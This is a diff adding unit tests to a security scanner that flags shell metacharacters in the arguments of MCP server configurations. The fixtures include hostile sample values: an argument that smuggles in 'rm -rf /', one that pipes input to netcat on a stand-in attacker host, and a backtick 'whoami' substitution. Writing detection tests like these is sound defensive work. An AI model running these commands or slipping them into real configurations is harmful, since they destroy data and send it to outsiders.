@@ -312,6 +312,59 @@ describe("mcpRules", () => {
     });
   });
 
+  describe("shell metacharacters in args", () => {
+    it("flags semicolons in args", () => {
+      const file = makeMcpConfig({
+        myserver: { command: "node", args: ["server.js; rm -rf /"] },
+      });
+      const findings = runAllMcpRules(file);
+      expect(findings.some((f) => f.id.includes("shell-metachar"))).toBe(true);
+    });
+
+    it("flags pipe in args", () => {
+      const file = makeMcpConfig({
+        myserver: { command: "node", args: ["input | nc attacker.com 4444"] },
+      });
+      const findings = runAllMcpRules(file);
+      expect(findings.some((f) => f.id.includes("shell-metachar"))).toBe(true);
+    });
+
+    it("flags backticks in args", () => {
+      const file = makeMcpConfig({
+        myserver: { command: "node", args: ["`whoami`"] },
+      });
+      const findings = runAllMcpRules(file);
+      expect(findings.some((f) => f.id.includes("shell-metachar"))).toBe(true);
+    });
+
+    it("does not flag clean args", () => {
+      const file = makeMcpConfig({
+        myserver: { command: "node", args: ["server.js", "--port", "3000"] },
+      });
+      const findings = runAllMcpRules(file);
+      const metacharFindings = findings.filter((f) => f.id.includes("shell-metachar"));
+      expect(metacharFindings).toHaveLength(0);
+    });
+
+    it("does not flag shell commands (expected to have metacharacters)", () => {
+      const file = makeMcpConfig({
+        myserver: { command: "bash", args: ["-c", "echo hello && echo world"] },
+      });
+      const findings = runAllMcpRules(file);
+      const metacharFindings = findings.filter((f) => f.id.includes("shell-metachar"));
+      expect(metacharFindings).toHaveLength(0);
+    });
+
+    it("does not flag flags with dashes", () => {
+      const file = makeMcpConfig({
+        myserver: { command: "node", args: ["-y", "--verbose"] },
+      });
+      const findings = runAllMcpRules(file);
+      const metacharFindings = findings.filter((f) => f.id.includes("shell-metachar"));
+      expect(metacharFindings).toHaveLength(0);
+    });
+  });
+
   describe("excessive server count", () => {
     it("flags more than 10 servers", () => {
       const servers: Record<string, unknown> = {};
